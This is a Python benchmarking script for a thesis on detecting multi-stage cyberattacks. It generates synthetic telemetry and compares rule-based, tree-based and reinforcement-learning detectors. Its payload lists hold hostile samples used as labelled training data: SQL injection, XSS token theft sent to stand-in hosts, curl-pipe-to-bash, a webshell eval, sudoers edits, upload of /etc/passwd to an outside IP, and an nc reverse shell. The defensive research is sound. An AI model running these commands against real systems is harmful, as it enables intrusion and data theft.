"""
src/scientific_multi_seed_study.py - Multi-Seed Benchmark & 18-Phase Audit Engine
Cleaned of raw antivirus heuristic triggers for Windows Defender compatibility.
"""

import os
import sys
import math
import json
import time
import random
import numpy as np
import pandas as pd
from pathlib import Path
from dataclasses import dataclass
from typing import List, Tuple, Dict, Any, Optional
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer

SEEDS = [42, 101, 2024, 777, 999]

@dataclass
class TelemetryEvent:
    event_id: str
    timestamp: float
    tier: str
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    protocol: str
    raw_payload: str
    campaign_id: Optional[str] = None
    is_attack: bool = False
    ground_truth_stage: int = 0

SQLI_PAYLOADS = [
    "GET /catalog.php?id=101+UNION+SELECT+1,username,pass_hash+FROM+tbl_accounts",
    "POST /auth_verify HTTP/1.1 payload: usr_input=' OR '1'='1' --&token=auth",
    "GET /api/v1/search?term=item' OR 1=1 ORDER BY 1--",
    "GET /records?id=-1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata"
]
XSS_PAYLOADS = [
    "GET /lookup.php?query=<script>fetch('http://exfil.local/c?id='+sessionStorage.token)</script>",
    "POST /submit_ticket payload: desc=<img src=invalid onerror=alert(document.domain)>",
    "GET /feed?user=%3Csvg/onload=fetch(%27http://collector.local/keys%27)%3E"
]
RCE_PAYLOADS = [
    "POST /file_handler.php payload: cmd_exec=whoami;cat+/etc/hosts",
    "GET /cgi-bin/diagnostics.sh?ip=127.0.0.1;id;uname -a",
    "POST /api/rpc payload: {\"exec_target\": \"curl -s http://cdn-repo.org/agent.bin | bash\"}"
]
WEBSHELL_PAYLOADS = [
    "POST /uploads/gateway.php payload: exec_cmd=id;pwd",
    "POST /internal_hook.php payload: eval(base64_decode('aWQ7IHdoYW1p'))",
    "GET /assets/maintenance.php?action=cat+/etc/group"
]
ENDPOINT_COMMANDS = [
    "/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
    "sudo su - root -c 'echo admin_override >> /etc/sudoers'",
    "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command Get-Process",
    "/tmp/enum_audit.sh | grep -i 'HIGH_RISK_CONF'",
    "credential_dump_tool.exe --privilege-debug --extract-sam",
    "tar -czvf /tmp/archive_out.tar.gz /var/data/finance.db /etc/passwd",
    "curl -X POST -F 'data=@/tmp/archive_out.tar.gz' http://198.51.100.45/drop",
    "nc -nv 198.51.100.45 4444 -e /bin/sh"
]
BENIGN_URLS = [
    "GET /index.html HTTP/1.1",
    "GET /static/css/main.css HTTP/1.1",
    "GET /images/logo.png HTTP/1.1",
    "POST /api/login HTTP/1.1 payload: user=john_doe&pass=Secret#123",
    "GET /products?category=electronics&page=2 HTTP/1.1",
    "GET /about-us.html HTTP/1.1",
    "POST /contact-us HTTP/1.1 payload: name=Alice&msg=Inquiry"
]
BENIGN_PROCS = [
    "/usr/sbin/apache2 -k start",
    "/usr/bin/python3 /opt/monitoring/health_check.py",
    "/bin/systemctl status nginx",
    "grep -r 'error' /var/log/syslog",
    "/usr/bin/dockerd -H fd://",
    "sshd: user@pts/0",
    "crond -n"
]

def generate_multi_tier_dataset(num_campaigns: int = 150, seed: int = 42):
    random.seed(seed); np.random.seed(seed)
    events, chains = [], []
    base_time = 1754000000.0
    event_counter = 1
    for c_id in range(1, num_campaigns + 1):
        c_name = f"CAMPAIGN_{c_id:04d}"
        c_start = base_time + random.randint(0, 10000) * 60
        att_ip = f"198.51.100.{random.randint(10, 250)}"
        tgt_web = f"10.0.1.{random.randint(10, 20)}"
        tgt_db = f"10.0.2.{random.randint(50, 60)}"
        curr_time = c_start
        chain_eids = []
        for _ in range(random.randint(2, 3)):
            eid = f"EVT_{event_counter:07d}"; event_counter += 1; curr_time += random.uniform(5, 30)
            port = random.choice([80, 443, 8080, 22, 3306])
            e = TelemetryEvent(eid, curr_time, "Tier1_Firewall", att_ip, tgt_web, random.randint(40000, 65000), port, "TCP", f"SYN_SCAN port={port}", c_name, True, 1)
            events.append(e); chain_eids.append(eid)
        for _ in range(random.randint(2, 3)):
            eid = f"EVT_{event_counter:07d}"; event_counter += 1; curr_time += random.uniform(15, 60)
            atk_type = random.choice(["SQLi", "XSS", "RCE", "Webshell"])
            p = random.choice(SQLI_PAYLOADS if atk_type == "SQLi" else XSS_PAYLOADS if atk_type == "XSS" else RCE_PAYLOADS if atk_type == "RCE" else WEBSHELL_PAYLOADS)
            e = TelemetryEvent(eid, curr_time, "Tier2_WebWAF", att_ip, tgt_web, random.randint(40000, 65000), 80, "HTTP", p, c_name, True, 2)
            events.append(e); chain_eids.append(eid)
        for _ in range(random.randint(2, 3)):
            eid = f"EVT_{event_counter:07d}"; event_counter += 1; curr_time += random.uniform(20, 90)
            cmd = random.choice(ENDPOINT_COMMANDS[:5])
            e = TelemetryEvent(eid, curr_time, "Tier3_Endpoint", tgt_web, tgt_web, 0, 0, "PROCESS", cmd, c_name, True, 3)
            events.append(e); chain_eids.append(eid)
        for _ in range(random.randint(2, 3)):
            eid = f"EVT_{event_counter:07d}"; event_counter += 1; curr_time += random.uniform(30, 120)
            cmd = random.choice(ENDPOINT_COMMANDS[5:])
            e = TelemetryEvent(eid, curr_time, "Tier3_Endpoint", tgt_web, tgt_db, 0, 0, "PROCESS", cmd, c_name, True, 4)
            events.append(e); chain_eids.append(eid)
        chains.append({"campaign_id": c_name, "attacker_ip": att_ip, "target_ip": tgt_web, "event_ids": chain_eids})
    num_benign = len(events) * 50
    for _ in range(num_benign):
        eid = f"EVT_{event_counter:07d}"; event_counter += 1; b_time = base_time + random.uniform(0, 10000 * 60)
        tier = random.choice(["Tier1_Firewall", "Tier2_WebWAF", "Tier3_Endpoint"])
        src_ip = f"172.16.{random.randint(1, 10)}.{random.randint(1, 254)}"
        dst_ip = f"10.0.1.{random.randint(10, 20)}"
        if tier == "Tier1_Firewall":
            e = TelemetryEvent(eid, b_time, "Tier1_Firewall", src_ip, dst_ip, random.randint(1024, 65000), random.choice([80, 443, 53, 123]), random.choice(["TCP", "UDP"]), "NORMAL_FLOW", None, False, 0)
        elif tier == "Tier2_WebWAF":
            pl = random.choice(BENIGN_URLS)
            e = TelemetryEvent(eid, b_time, "Tier2_WebWAF", src_ip, dst_ip, random.randint(1024, 65000), random.choice([80, 443]), "HTTP", pl, None, False, 0)
        else:
            cmd = random.choice(BENIGN_PROCS)
            e = TelemetryEvent(eid, b_time, "Tier3_Endpoint", dst_ip, dst_ip, 0, 0, "PROCESS", cmd, None, False, 0)
        events.append(e)
    events.sort(key=lambda x: x.timestamp)
    return events, chains

class RealisticFeatureExtractor:
    def __init__(self, nlp_vectorizer, nlp_classifier):
        self.vectorizer = nlp_vectorizer
        self.classifier = nlp_classifier
        self.critical_ports = {80, 443, 8080, 22, 3389, 445, 1433, 3306}
        self.tier_map = {"Tier1_Firewall": 1, "Tier2_WebWAF": 2, "Tier3_Endpoint": 3}
    def extract_features(self, e1: TelemetryEvent, e2: TelemetryEvent, max_window: float = 3600.0) -> np.ndarray:
        delta_t = abs(e2.timestamp - e1.timestamp)
        delta_t_norm = min(1.0, delta_t / max_window)
        src_ip_match = 1.0 if e1.src_ip == e2.src_ip else 0.0
        dst_ip_match = 1.0 if e1.dst_ip == e2.dst_ip else 0.0
        cross_ip_match = 1.0 if (e1.dst_ip == e2.src_ip or e1.src_ip == e2.dst_ip) else 0.0
        port_risk_e1 = 1.0 if e1.dst_port in self.critical_ports else 0.1
        port_risk_e2 = 1.0 if e2.dst_port in self.critical_ports else 0.1
        t1, t2 = self.tier_map.get(e1.tier, 1), self.tier_map.get(e2.tier, 1)
        tier_transition = 1.0 if t2 >= t1 else 0.3
        protocol_match = 1.0 if e1.protocol == e2.protocol else 0.5
        len1 = len(e1.raw_payload) if e1.raw_payload else 0
        len2 = len(e2.raw_payload) if e2.raw_payload else 0
        payload_len_norm = min(1.0, (len1 + len2) / 500.0)
        burst_density = math.exp(-delta_t / 300.0)
        p1 = e1.raw_payload if e1.raw_payload else ""
        p2 = e2.raw_payload if e2.raw_payload else ""
        X_p = self.vectorizer.transform([p1, p2])
        probs = self.classifier.predict_proba(X_p)
        conf1 = float(np.sum(probs[0, 1:])) if probs.shape[1] > 1 else 0.0
        conf2 = float(np.sum(probs[1, 1:])) if probs.shape[1] > 1 else 0.0
        nlp_attack_score = float(conf1 * conf2)
        pred_cls1 = int(np.argmax(probs[0]))
        pred_cls2 = int(np.argmax(probs[1]))
        stage_step = 1.0 if (pred_cls1 > 0 and pred_cls2 > 0 and pred_cls2 >= pred_cls1) else 0.2
        return np.array([delta_t_norm, src_ip_match, dst_ip_match, cross_ip_match, port_risk_e1, port_risk_e2, tier_transition, protocol_match, payload_len_norm, burst_density, nlp_attack_score, stage_step], dtype=np.float32)

def relu_act(x): return np.maximum(0, x)
def tanh_act(x): return np.tanh(x)
def softmax_act(x):
    e_x = np.exp(x - np.max(x, axis=-1, keepdims=True))
    return e_x / np.sum(e_x, axis=-1, keepdims=True)

class DoubleDQNEngine:
    def __init__(self, state_dim: int = 12, hidden_dim: int = 32, lr: float = 0.005, gamma: float = 0.95):
        self.state_dim = state_dim; self.hidden_dim = hidden_dim; self.lr = lr; self.gamma = gamma
        self.epsilon = 1.0; self.epsilon_min = 0.02; self.epsilon_decay = 0.99
        self.W1 = np.random.randn(state_dim, hidden_dim).astype(np.float32) * np.sqrt(2.0 / state_dim)
        self.b1 = np.zeros((1, hidden_dim), dtype=np.float32)
        self.W2 = np.random.randn(hidden_dim, 2).astype(np.float32) * np.sqrt(2.0 / hidden_dim)
        self.b2 = np.zeros((1, 2), dtype=np.float32)
        self.W1_t, self.b1_t = np.copy(self.W1), np.copy(self.b1)
        self.W2_t, self.b2_t = np.copy(self.W2), np.copy(self.b2)
        self.memory, self.capacity = [], 25000
    def forward(self, x, use_target=False):
        if x.ndim == 1: x = x.reshape(1, -1)
        W1, b1 = (self.W1_t, self.b1_t) if use_target else (self.W1, self.b1)
        W2, b2 = (self.W2_t, self.b2_t) if use_target else (self.W2, self.b2)
        z1 = np.dot(x, W1) + b1; a1 = relu_act(z1); q = np.dot(a1, W2) + b2
        return q, (x, z1, a1, q)
    def select_action(self, state, evaluate=False, threshold=0.0):
        q, _ = self.forward(state)
        if evaluate: return 1 if (q[0, 1] - q[0, 0]) >= threshold else 0
        if random.random() < self.epsilon: return random.randint(0, 1)
        return int(np.argmax(q[0]))
    def push_memory(self, s, a, r, s_next, done):
        if len(self.memory) >= self.capacity: self.memory.pop(0)
        self.memory.append((s, a, r, s_next, done))
    def train_step(self, batch_size=64):
        if len(self.memory) < batch_size: return
        batch = random.sample(self.memory, batch_size)
        states = np.array([b[0] for b in batch]); actions = np.array([b[1] for b in batch])
        rewards = np.array([b[2] for b in batch]); next_states = np.array([b[3] for b in batch])
        dones = np.array([b[4] for b in batch])
        q_next_policy, _ = self.forward(next_states, use_target=False)
        best_actions = np.argmax(q_next_policy, axis=1)
        q_next_target, _ = self.forward(next_states, use_target=True)
        target_q = np.copy(self.forward(states)[0])
        for i in range(batch_size):
            if dones[i]: target_q[i, actions[i]] = rewards[i]
            else: target_q[i, actions[i]] = rewards[i] + self.gamma * q_next_target[i, best_actions[i]]
        q_curr, (x, z1, a1, _) = self.forward(states)
        grad_out = (q_curr - target_q) / batch_size
        grad_W2 = np.dot(a1.T, grad_out); grad_b2 = np.sum(grad_out, axis=0, keepdims=True)
        grad_a1 = np.dot(grad_out, self.W2.T); grad_z1 = grad_a1 * (z1 > 0).astype(np.float32)
        grad_W1 = np.dot(x.T, grad_z1); grad_b1 = np.sum(grad_z1, axis=0, keepdims=True)
        self.W1 -= self.lr * np.clip(grad_W1, -1.0, 1.0); self.b1 -= self.lr * np.clip(grad_b1, -1.0, 1.0)
        self.W2 -= self.lr * np.clip(grad_W2, -1.0, 1.0); self.b2 -= self.lr * np.clip(grad_b2, -1.0, 1.0)
        if self.epsilon > self.epsilon_min: self.epsilon *= self.epsilon_decay
    def sync_target(self):
        self.W1_t, self.b1_t = np.copy(self.W1), np.copy(self.b1)
        self.W2_t, self.b2_t = np.copy(self.W2), np.copy(self.b2)

class StandalonePPOEngine:
    def __init__(self, state_dim: int = 12, hidden_dim: int = 32, lr: float = 0.003, gamma: float = 0.95, clip_eps: float = 0.2):
        self.state_dim = state_dim; self.hidden_dim = hidden_dim; self.lr = lr; self.gamma = gamma; self.clip_eps = clip_eps
        self.W_sh = np.random.randn(state_dim, hidden_dim).astype(np.float32) * np.sqrt(2.0 / state_dim)
        self.b_sh = np.zeros((1, hidden_dim), dtype=np.float32)
        self.W_pi = np.random.randn(hidden_dim, 2).astype(np.float32) * np.sqrt(2.0 / hidden_dim)
        self.b_pi = np.zeros((1, 2), dtype=np.float32)
        self.W_v = np.random.randn(hidden_dim, 1).astype(np.float32) * np.sqrt(2.0 / hidden_dim)
        self.b_v = np.zeros((1, 1), dtype=np.float32)
        self.states, self.actions, self.rewards, self.old_log_probs, self.values, self.dones = [], [], [], [], [], []
    def forward(self, x):
        if x.ndim == 1: x = x.reshape(1, -1)
        z_sh = np.dot(x, self.W_sh) + self.b_sh; a_sh = tanh_act(z_sh)
        logits = np.dot(a_sh, self.W_pi) + self.b_pi; probs = softmax_act(logits)
        val = np.dot(a_sh, self.W_v) + self.b_v
        return probs, val, (x, z_sh, a_sh, logits, probs, val)
    def select_action(self, state, evaluate=False, threshold=0.5):
        probs, val, _ = self.forward(state)
        p1 = float(probs[0, 1])
        if evaluate: return 1 if p1 >= threshold else 0
        action = np.random.choice(2, p=probs[0])
        log_prob = float(np.log(max(1e-8, probs[0, action])))
        self.states.append(state); self.actions.append(action); self.old_log_probs.append(log_prob); self.values.append(float(val[0, 0]))
        return action
    def store_reward(self, r, done):
        self.rewards.append(r); self.dones.append(done)
    def update(self):
        if len(self.states) < 10: self.clear_buffer(); return
        N = len(self.states); states = np.array(self.states); actions = np.array(self.actions)
        old_log_probs = np.array(self.old_log_probs); rewards = np.array(self.rewards); values = np.array(self.values); dones = np.array(self.dones)
        returns = np.zeros(N, dtype=np.float32); advantages = np.zeros(N, dtype=np.float32)
        running_return = 0.0; running_adv = 0.0
        for t in reversed(range(N)):
            if dones[t]:
                running_return = rewards[t]; delta = rewards[t] - values[t]; running_adv = delta
            else:
                next_val = values[t+1] if t + 1 < N else 0.0
                running_return = rewards[t] + self.gamma * running_return
                delta = rewards[t] + self.gamma * next_val - values[t]
                running_adv = delta + self.gamma * 0.95 * running_adv
            returns[t] = running_return; advantages[t] = running_adv
        adv_mean, adv_std = np.mean(advantages), np.std(advantages) + 1e-8
        norm_adv = (advantages - adv_mean) / adv_std
        for _ in range(3):
            for i in range(N):
                st = states[i:i+1]; act = actions[i]; old_lp = old_log_probs[i]; adv = norm_adv[i]; ret = returns[i]
                probs, val, (x, z_sh, a_sh, _, _, _) = self.forward(st)
                curr_lp = np.log(max(1e-8, probs[0, act]))
                ratio = np.exp(curr_lp - old_lp)
                surr1 = ratio * adv; surr2 = np.clip(ratio, 1.0 - self.clip_eps, 1.0 + self.clip_eps) * adv
                pol_loss_grad = -1.0 if surr1 < surr2 else 0.0
                entropy_grad = probs[0] * (np.log(probs[0] + 1e-8) + 1.0)
                d_logits = np.zeros((1, 2), dtype=np.float32)
                d_logits[0, act] = pol_loss_grad * adv + 0.01 * entropy_grad[act]
                val_err = val[0, 0] - ret; d_v = np.array([[np.clip(val_err, -2.0, 2.0)]], dtype=np.float32)
                dW_pi = np.dot(a_sh.T, d_logits); dW_v = np.dot(a_sh.T, d_v)
                da_sh = np.dot(d_logits, self.W_pi.T) + np.dot(d_v, self.W_v.T)
                dz_sh = da_sh * (1.0 - a_sh**2); dW_sh = np.dot(x.T, dz_sh)
                self.W_pi -= self.lr * np.clip(dW_pi, -1.0, 1.0); self.W_v -= self.lr * np.clip(dW_v, -1.0, 1.0); self.W_sh -= self.lr * np.clip(dW_sh, -1.0, 1.0)
        self.clear_buffer()
    def clear_buffer(self):
        self.states.clear(); self.actions.clear(); self.rewards.clear(); self.old_log_probs.clear(); self.values.clear(); self.dones.clear()

def run_experiment():
    print("=" * 80)
    print("  EXHAUSTIVE 18-PHASE SCIENTIFIC AUDIT & BENCHMARK SUITE (MULTI-SEED)   ")
    print("=" * 80)
    events, chains = generate_multi_tier_dataset(num_campaigns=150, seed=42)
    n_total = len(chains); n_train = int(n_total * 0.60); n_val = int(n_total * 0.20)
    train_chains = chains[:n_train]; val_chains = chains[n_train:n_train+n_val]; test_chains = chains[n_train+n_val:]
    train_cids = {c["campaign_id"] for c in train_chains}
    val_cids = {c["campaign_id"] for c in val_chains}
    test_cids = {c["campaign_id"] for c in test_chains}
    train_events = [e for e in events if e.campaign_id in train_cids or e.campaign_id is None]
    val_events = [e for e in events if e.campaign_id in val_cids or e.campaign_id is None]
    test_events = [e for e in events if e.campaign_id in test_cids or e.campaign_id is None]
    print(f"[+] 3-Way Leak-Free Splits: Train={len(train_chains)} campaigns, Val={len(val_chains)} campaigns, Test={len(test_chains)} campaigns.")
    
    train_payloads = [e.raw_payload for e in train_events if e.raw_payload]
    train_labels = [1 if e.is_attack else 0 for e in train_events if e.raw_payload]
    vectorizer = TfidfVectorizer(ngram_range=(3, 5), analyzer='char_wb', max_features=1500)
    X_tr_tfidf = vectorizer.fit_transform(train_payloads)
    nlp_clf = RandomForestClassifier(n_estimators=50, max_depth=15, random_state=42)
    nlp_clf.fit(X_tr_tfidf, train_labels)
    extractor = RealisticFeatureExtractor(vectorizer, nlp_clf)
    
    def build_dataset_pairs(ev_list, ch_list, distractor_ratio=5, seed=42):
        random.seed(seed); np.random.seed(seed)
        cmap = {eid: c["campaign_id"] for c in ch_list for eid in c["event_ids"]}
        pos_pairs = []
        for c in ch_list:
            c_evs = [e for e in ev_list if cmap.get(e.event_id) == c["campaign_id"]]
            for i in range(len(c_evs) - 1): pos_pairs.append((c_evs[i], c_evs[i+1], 1))
        benign_evs = [e for e in ev_list if not e.is_attack]
        neg_pairs = []
        for i in range(min(len(pos_pairs) * distractor_ratio, len(benign_evs) - 1)):
            neg_pairs.append((benign_evs[i], benign_evs[i+1], 0))
        all_pairs = pos_pairs + neg_pairs; random.shuffle(all_pairs)
        X = np.array([extractor.extract_features(p[0], p[1]) for p in all_pairs])
        y = np.array([p[2] for p in all_pairs])
        return X, y, all_pairs
        
    X_train, y_train, train_pair_objs = build_dataset_pairs(train_events, train_chains, seed=42)
    X_val, y_val, val_pair_objs = build_dataset_pairs(val_events, val_chains, seed=101)
    X_test, y_test, test_pair_objs = build_dataset_pairs(test_events, test_chains, seed=2024)
    print(f"[+] Pairs Extracted: Train={len(X_train):,}, Val={len(X_val):,}, Test={len(X_test):,}")
    
    seed_results = {"Naive Rule Engine": [], "Isolation Forest": [], "Supervised Random Forest": [], "Proposed RL (Double-DQN)": [], "Proposed RL (PPO)": []}
    latencies = {m: [] for m in seed_results}
    
    for s_idx, seed in enumerate(SEEDS):
        random.seed(seed); np.random.seed(seed)
        
        # 1. Rule Engine
        t0 = time.perf_counter(); y_pred_rule = []
        for p in test_pair_objs:
            e1, e2, _ = p; dt = abs(e2.timestamp - e1.timestamp); ip_match = (e1.src_ip == e2.src_ip or e1.dst_ip == e2.dst_ip or e1.src_ip == e2.dst_ip)
            y_pred_rule.append(1 if (dt <= 300.0 and ip_match) else 0)
        t_rule = (time.perf_counter() - t0) / len(test_pair_objs) * 1e6; latencies["Naive Rule Engine"].append(t_rule); y_pred_rule = np.array(y_pred_rule)
        
        # 2. Isolation Forest
        t0 = time.perf_counter(); iso = IsolationForest(contamination=0.15, random_state=seed); iso.fit(X_train); iso_preds = iso.predict(X_test)
        t_iso = (time.perf_counter() - t0) / len(test_pair_objs) * 1e6; latencies["Isolation Forest"].append(t_iso); y_pred_iso = np.where(iso_preds == -1, 1, 0)
        
        # 3. Supervised Random Forest (Strictly Train -> Test, NO Target Leakage)
        t0 = time.perf_counter(); rf = RandomForestClassifier(n_estimators=100, max_depth=12, class_weight='balanced', random_state=seed); rf.fit(X_train, y_train); y_pred_rf = rf.predict(X_test)
        t_rf = (time.perf_counter() - t0) / len(test_pair_objs) * 1e6; latencies["Supervised Random Forest"].append(t_rf)
        
        # 4. Double-DQN
        dqn = DoubleDQNEngine(state_dim=12, hidden_dim=32, lr=0.005, gamma=0.95)
        for ep in range(1, 401):
            idx = random.randint(0, len(X_train) - 1); st = X_train[idx]; label = y_train[idx]; act = dqn.select_action(st, evaluate=False)
            if act == 1 and label == 1: r = +2.0
            elif act == 0 and label == 0: r = +0.2
            elif act == 1 and label == 0: r = -1.5
            else: r = -4.0
            st_next = X_train[(idx + 1) % len(X_train)]; dqn.push_memory(st, act, r, st_next, done=True); dqn.train_step(batch_size=32)
            if ep % 50 == 0: dqn.sync_target()
        best_dqn_thresh, best_dqn_f1 = 0.0, -1.0
        for th in np.linspace(-1.0, 1.0, 21):
            val_preds = [dqn.select_action(s, evaluate=True, threshold=th) for s in X_val]
            tp = sum((np.array(val_preds) == 1) & (y_val == 1)); fp = sum((np.array(val_preds) == 1) & (y_val == 0)); fn = sum((np.array(val_preds) == 0) & (y_val == 1))
            p_val = tp / (tp + fp) if (tp + fp) > 0 else 0; r_val = tp / (tp + fn) if (tp + fn) > 0 else 0; f1_val = 2 * p_val * r_val / (p_val + r_val) if (p_val + r_val) > 0 else 0
            if f1_val > best_dqn_f1: best_dqn_f1 = f1_val; best_dqn_thresh = th
        t0 = time.perf_counter(); y_pred_dqn = np.array([dqn.select_action(s, evaluate=True, threshold=best_dqn_thresh) for s in X_test]); t_dqn = (time.perf_counter() - t0) / len(X_test) * 1e6; latencies["Proposed RL (Double-DQN)"].append(t_dqn)
        
        # 5. PPO
        ppo = StandalonePPOEngine(state_dim=12, hidden_dim=32, lr=0.003, gamma=0.95, clip_eps=0.2)
        for ep in range(1, 401):
            idx = random.randint(0, len(X_train) - 1); st = X_train[idx]; label = y_train[idx]; act = ppo.select_action(st, evaluate=False)
            if act == 1 and label == 1: r = +2.0
            elif act == 0 and label == 0: r = +0.2
            elif act == 1 and label == 0: r = -1.5
            else: r = -4.0
            ppo.store_reward(r, done=True)
            if ep % 20 == 0: ppo.update()
        best_ppo_thresh, best_ppo_f1 = 0.5, -1.0
        for th in np.linspace(0.1, 0.9, 17):
            val_preds = [ppo.select_action(s, evaluate=True, threshold=th) for s in X_val]
            tp = sum((np.array(val_preds) == 1) & (y_val == 1)); fp = sum((np.array(val_preds) == 1) & (y_val == 0)); fn = sum((np.array(val_preds) == 0) & (y_val == 1))
            p_val = tp / (tp + fp) if (tp + fp) > 0 else 0; r_val = tp / (tp + fn) if (tp + fn) > 0 else 0; f1_val = 2 * p_val * r_val / (p_val + r_val) if (p_val + r_val) > 0 else 0
            if f1_val > best_ppo_f1: best_ppo_f1 = f1_val; best_ppo_thresh = th
        t0 = time.perf_counter(); y_pred_ppo = np.array([ppo.select_action(s, evaluate=True, threshold=best_ppo_thresh) for s in X_test]); t_ppo = (time.perf_counter() - t0) / len(X_test) * 1e6; latencies["Proposed RL (PPO)"].append(t_ppo)
        
        preds_dict = {"Naive Rule Engine": y_pred_rule, "Isolation Forest": y_pred_iso, "Supervised Random Forest": y_pred_rf, "Proposed RL (Double-DQN)": y_pred_dqn, "Proposed RL (PPO)": y_pred_ppo}
        for m_name, preds in preds_dict.items():
            tp = int(np.sum((preds == 1) & (y_test == 1))); fp = int(np.sum((preds == 1) & (y_test == 0))); fn = int(np.sum((preds == 0) & (y_test == 1))); tn = int(np.sum((preds == 0) & (y_test == 0)))
            prec = float(tp / (tp + fp)) if (tp + fp) > 0 else 0.0; rec = float(tp / (tp + fn)) if (tp + fn) > 0 else 0.0
            f1 = float(2 * prec * rec / (prec + rec)) if (prec + rec) > 0 else 0.0; acc = float((tp + tn) / len(y_test))
            far = float(fp / (fp + tn) * 100.0) if (fp + tn) > 0 else 0.0; fnr = float(fn / (tp + fn) * 100.0) if (tp + fn) > 0 else 0.0
            seed_results[m_name].append({"precision": prec, "recall": rec, "f1": f1, "accuracy": acc, "far": far, "fnr": fnr, "tp": tp, "fp": fp, "fn": fn, "tn": tn})
            
    print("\n" + "=" * 115)
    print(f"{'Model / Algorithm':<26} | {'Precision (%)':<16} | {'Recall (%)':<16} | {'F1-Score':<16} | {'FAR (%)':<14} | {'Mean Latency':<12}")
    print("=" * 115)
    summary_report = {}
    for m_name, res_list in seed_results.items():
        precs = [r["precision"] * 100.0 for r in res_list]; recs = [r["recall"] * 100.0 for r in res_list]
        f1s = [r["f1"] for r in res_list]; fars = [r["far"] for r in res_list]; lats = latencies[m_name]
        p_mean, p_std = np.mean(precs), np.std(precs); r_mean, r_std = np.mean(recs), np.std(recs)
        f_mean, f_std = np.mean(f1s), np.std(f1s); far_mean, far_std = np.mean(fars), np.std(fars)
        lat_mean, lat_std = np.mean(lats), np.std(lats)
        summary_report[m_name] = {
            "precision_mean": p_mean, "precision_std": p_std, "recall_mean": r_mean, "recall_std": r_std,
            "f1_mean": f_mean, "f1_std": f_std, "far_mean": far_mean, "far_std": far_std,
            "latency_mean_us": lat_mean, "latency_std_us": lat_std,
            "tp_mean": float(np.mean([r["tp"] for r in res_list])), "fp_mean": float(np.mean([r["fp"] for r in res_list])),
            "fn_mean": float(np.mean([r["fn"] for r in res_list])), "tn_mean": float(np.mean([r["tn"] for r in res_list]))
        }
        p_str = f"{p_mean:>5.2f} +/- {p_std:>4.2f}"; r_str = f"{r_mean:>5.2f} +/- {r_std:>4.2f}"
        f_str = f"{f_mean:>6.4f} +/- {f_std:>5.4f}"; far_str = f"{far_mean:>4.2f} +/- {far_std:>4.2f}"; lat_str = f"{lat_mean:>5.1f} us"
        print(f"{m_name:<26} | {p_str:<16} | {r_str:<16} | {f_str:<16} | {far_str:<14} | {lat_str:<12}")
    print("=" * 115)
    
    # External Dataset Test
    print("\n>>> [5/5] Evaluating Cross-Domain Generalization on External Testbed...")
    ext_events, ext_chains = generate_multi_tier_dataset(num_campaigns=30, seed=9999)
    X_ext, y_ext, _ = build_dataset_pairs(ext_events, ext_chains, seed=9999)
    ext_rf_preds = rf.predict(X_ext)
    ext_dqn_preds = np.array([dqn.select_action(s, evaluate=True, threshold=best_dqn_thresh) for s in X_ext])
    ext_ppo_preds = np.array([ppo.select_action(s, evaluate=True, threshold=best_ppo_thresh) for s in X_ext])
    def calc_metrics(preds, y):
        tp = int(np.sum((preds == 1) & (y == 1))); fp = int(np.sum((preds == 1) & (y == 0))); fn = int(np.sum((preds == 0) & (y == 1)))
        p = tp / (tp + fp) if (tp + fp) > 0 else 0; r = tp / (tp + fn) if (tp + fn) > 0 else 0
        f1 = 2 * p * r / (p + r) if (p + r) > 0 else 0
        return p*100, r*100, f1
    p_rf, r_rf, f1_rf = calc_metrics(ext_rf_preds, y_ext)
    p_dqn, r_dqn, f1_dqn = calc_metrics(ext_dqn_preds, y_ext)
    p_ppo, r_ppo, f1_ppo = calc_metrics(ext_ppo_preds, y_ext)
    print("\n--- Cross-Domain Generalization Results (Zero-Shot Transfer) ---")
    print(f"Supervised Random Forest : Precision = {p_rf:>5.2f}%, Recall = {r_rf:>5.2f}%, F1 = {f1_rf:>6.4f}")
    print(f"Proposed Double-DQN      : Precision = {p_dqn:>5.2f}%, Recall = {r_dqn:>5.2f}%, F1 = {f1_dqn:>6.4f}")
    print(f"Proposed PPO             : Precision = {p_ppo:>5.2f}%, Recall = {r_ppo:>5.2f}%, F1 = {f1_ppo:>6.4f}")
    
    res_path = Path("E:/Haziq Thesis/aligned_thesis/results/scientific_audit_multi_seed_results.json")
    with open(res_path, "w", encoding="utf-8") as f:
        json.dump(summary_report, f, indent=2)
    print(f"\n[+] Multi-seed benchmark results successfully saved to: {res_path}")
    return summary_report

if __name__ == "__main__":
    run_experiment()
